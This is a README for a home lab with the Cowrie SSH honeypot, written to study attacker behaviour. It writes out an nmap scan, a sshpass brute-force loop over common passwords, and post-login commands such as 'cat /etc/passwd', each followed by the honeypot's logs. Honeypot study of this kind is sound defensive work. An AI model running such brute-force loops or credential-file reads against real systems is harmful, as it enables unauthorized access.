# Cowrie Honeypot Lab

This repository documents my experiments with the [Cowrie](https://github.com/cowrie/cowrie) honeypot.  
The goal was to simulate a typical SSH attack chain: port scanning, brute-force login attempts, and command execution.

---

## ⚙️ Environment
- **Attacker machine:** Linux Mint  
- **Honeypot machine:** Ubuntu 22.04 (VirtualBox VM)  
- **Cowrie:** SSH honeypot listening on port `2222`  
- **Network:** Bridged adapter  
- **IP addresses** in this documentation are anonymized as `ATTACKER_IP` and `HONEYPOT_IP`  

---

## 🔍 1. Discovery (Port Scanning)

An attacker scans the network to discover open ports:

```bash
nmap -sV -p 2222 HONEYPOT_IP
```

Example result:

```
PORT     STATE SERVICE VERSION
2222/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
```

The attacker now knows there is an SSH service running on port `2222`.

---

## 🔐 2. Brute-force Attack

A simple brute-force script was executed against the honeypot:

```bash
for u in root admin test; do
  for p in 1234 password toor qwerty; do
    sshpass -p "$p" ssh -p 2222 \
      -o StrictHostKeyChecking=no \
      -o ConnectTimeout=1 \
      $u@HONEYPOT_IP "exit" || true
  done
done
```

Log output inside `cowrie.json`:

```json
{
  "eventid": "cowrie.login.failed",
  "username": "test",
  "password": "1234",
  "src_ip": "ATTACKER_IP"
}
```

---

## 📜 3. Post-login Activity

When the correct password was found (`test:1234`),  
the attacker was able to log in and start issuing commands:

```bash
uname -a
cat /etc/passwd
ls -la
```

Cowrie recorded these commands in its logs:

```json
{
  "eventid": "cowrie.command.input",
  "input": "uname -a",
  "src_ip": "ATTACKER_IP"
}
```

---

## 📂 Logs and Data

Cowrie provides multiple log formats:
- **Text log:** `var/log/cowrie/cowrie.log`  
- **JSON log:** `var/log/cowrie/cowrie.json`  
- **Full session playback:** `var/log/cowrie/tty/`  

---

## ✅ Conclusion

Cowrie successfully simulated an SSH server, captured brute-force attempts,  
and logged attacker activity after login.  

This experiment demonstrates how honeypots can be used to study attacker behavior  
in a safe and controlled environment.  

**Next steps:**
- Integrate Cowrie logs into ELK / Kibana dashboards  
- Forward logs to Wazuh SIEM for further analysis  
- Deploy Cowrie on a VPS to capture real-world attacks from the internet  

